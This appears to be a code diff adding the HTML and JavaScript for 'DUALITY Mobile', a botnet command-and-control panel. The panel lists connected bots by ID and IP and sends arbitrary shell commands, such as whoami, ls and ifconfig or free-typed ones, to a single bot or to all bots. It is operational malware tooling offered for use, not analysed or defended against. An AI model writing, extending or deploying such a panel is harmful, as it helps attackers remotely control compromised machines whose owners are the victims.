@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
+    <meta name="theme-color" content="#9c27b0">
+    <title>DUALITY Mobile</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: #0a0e1a;
+            color: #00ff88;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+        
+        /* Mobile First */
+        .stats-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff88;
+            border-radius: 16px;
+            padding: 16px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 36px;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #888;
+            margin-top: 4px;
+        }
+        
+        /* Main Container */
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        
+        /* Bot List */
+        .bot-list, .command-panel, .output-console {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff88;
+            border-radius: 16px;
+            padding: 16px;
+        }
+        
+        .bot-list h3, .command-panel h3, .output-console h3 {
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .bot-item {
+            padding: 12px;
+            margin: 8px 0;
+            background: #0a0e1a;
+            border-radius: 12px;
+            border-left: 3px solid #00ff88;
+        }
+        
+        .bot-name {
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .bot-ip {
+            font-size: 11px;
+            color: #888;
+        }
+        
+        /* Command Input */
+        .command-input {
+            width: 100%;
+            padding: 12px;
+            background: #0a0e1a;
+            border: 1px solid #00ff88;
+            color: #00ff88;
+            border-radius: 12px;
+            font-size: 14px;
+            margin: 8px 0;
+        }
+        
+        .button {
+            background: #00ff88;
+            color: #0a0e1a;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 14px;
+            width: 100%;
+            margin: 4px 0;
+        }
+        
+        .quick-commands {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 12px 0;
+        }
+        
+        .quick-btn {
+            flex: 1;
+            min-width: 70px;
+            padding: 8px;
+            font-size: 12px;
+            background: #1a1a2e;
+        }
+        
+        .output-console {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .output-line {
+            font-size: 11px;
+            font-family: monospace;
+            margin: 4px 0;
+            border-left: 2px solid #00ff88;
+            padding-left: 8px;
+            word-break: break-all;
+        }
+        
+        /* Select dropdown */
+        select.command-input {
+            appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg fill='%2300ff88' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+        }
+        
+        @media (min-width: 768px) {
+            body {
+                padding: 24px;
+                max-width: 1200px;
+                margin: 0 auto;
+            }
+            
+            .stats-container {
+                flex-direction: row;
+            }
+            
+            .stat-card {
+                flex: 1;
+            }
+            
+            .main-container {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 20px;
+            }
+            
+            .output-console {
+                grid-column: span 2;
+            }
+            
+            .button {
+                width: auto;
+            }
+        }
+        
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #00ff88;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header" style="text-align: center; margin-bottom: 20px;">
+        <h1 style="font-size: 24px;">🔮 DUALITY</h1>
+        <p style="font-size: 12px; color: #888;">Mobile Command Center</p>
+    </div>
+    
+    <div class="stats-container" id="statsContainer">
+        <div class="stat-card">
+            <div class="stat-number" id="totalBots">0</div>
+            <div class="stat-label">Total Bots</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="activeBots">0</div>
+            <div class="stat-label">Active</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="alerts">0</div>
+            <div class="stat-label">Alerts</div>
+        </div>
+    </div>
+    
+    <div class="main-container">
+        <div class="bot-list">
+            <h3>📡 Connected Bots</h3>
+            <div id="botList"></div>
+        </div>
+        
+        <div class="command-panel">
+            <h3>⚡ Quick Commands</h3>
+            <div class="quick-commands">
+                <button class="button quick-btn" onclick="quickCommand('whoami')">whoami</button>
+                <button class="button quick-btn" onclick="quickCommand('pwd')">pwd</button>
+                <button class="button quick-btn" onclick="quickCommand('ls')">ls</button>
+                <button class="button quick-btn" onclick="quickCommand('ifconfig')">ip</button>
+            </div>
+            <select id="botSelect" class="command-input">
+                <option value="all">🌐 All Bots</option>
+            </select>
+            <input type="text" id="commandInput" class="command-input" placeholder="Enter command..." onkeypress="if(event.keyCode==13) sendCommand()">
+            <button class="button" onclick="sendCommand()">🚀 Send</button>
+            <button class="button" onclick="clearConsole()" style="background: #333;">🗑️ Clear</button>
+        </div>
+        
+        <div class="output-console">
+            <h3>📝 Console</h3>
+            <div id="consoleOutput"></div>
+        </div>
+    </div>
+    
+    <script>
+        let socket = io();
+        
+        socket.on('connect', function() {
+            addOutput('[*] Connected to DUALITY server');
+        });
+        
+        function addOutput(text) {
+            let timestamp = new Date().toLocaleTimeString();
+            let consoleDiv = document.getElementById('consoleOutput');
+            consoleDiv.innerHTML = `<div class="output-line">[${timestamp}] ${escapeHtml(text)}</div>` + consoleDiv.innerHTML;
+            
+            // Limit to 50 lines
+            if(consoleDiv.children.length > 50) {
+                consoleDiv.removeChild(consoleDiv.lastChild);
+            }
+        }
+        
+        function quickCommand(cmd) {
+            document.getElementById('commandInput').value = cmd;
+            sendCommand();
+        }
+        
+        function sendCommand() {
+            let botId = document.getElementById('botSelect').value;
+            let command = document.getElementById('commandInput').value;
+            
+            if(!command) return;
+            
+            addOutput(`[→] Command to ${botId}: ${command}`);
+            
+            fetch('/api/send_command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({bot_id: botId, command: command})
+            }).then(() => {
+                document.getElementById('commandInput').value = '';
+            });
+        }
+        
+        function clearConsole() {
+            document.getElementById('consoleOutput').innerHTML = '';
+        }
+        
+        function escapeHtml(text) {
+            return text.replace(/[&<>]/g, function(m) {
+                if(m === '&') return '&amp;';
+                if(m === '<') return '&lt;';
+                if(m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        // Load bots
+        function loadBots() {
+            fetch('/api/bots')
+                .then(res => res.json())
+                .then(data => {
+                    let bots = data.bots;
+                    let botList = '';
+                    let botSelect = '<option value="all">🌐 All Bots</option>';
+                    
+                    for(let id in bots) {
+                        let bot = bots[id];
+                        botList += `
+                            <div class="bot-item" onclick="selectBot('${id}')">
+                                <div class="bot-name">${id}</div>
+                                <div class="bot-ip">IP: ${bot.ip}</div>
+                            </div>
+                        `;
+                        botSelect += `<option value="${id}">${id}</option>`;
+                    }
+                    
+                    document.getElementById('botList').innerHTML = botList || '<p style="color:#888">No bots connected</p>';
+                    document.getElementById('botSelect').innerHTML = botSelect;
+                    document.getElementById('totalBots').innerText = Object.keys(bots).length;
+                    document.getElementById('activeBots').innerText = Object.values(bots).filter(b => b.status === 'active').length;
+                });
+        }
+        
+        function selectBot(botId) {
+            document.getElementById('botSelect').value = botId;
+            addOutput(`[*] Selected: ${botId}`);
+        }
+        
+        // Auto refresh
+        setInterval(loadBots, 5000);
+        loadBots();
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+</body>
+</html>
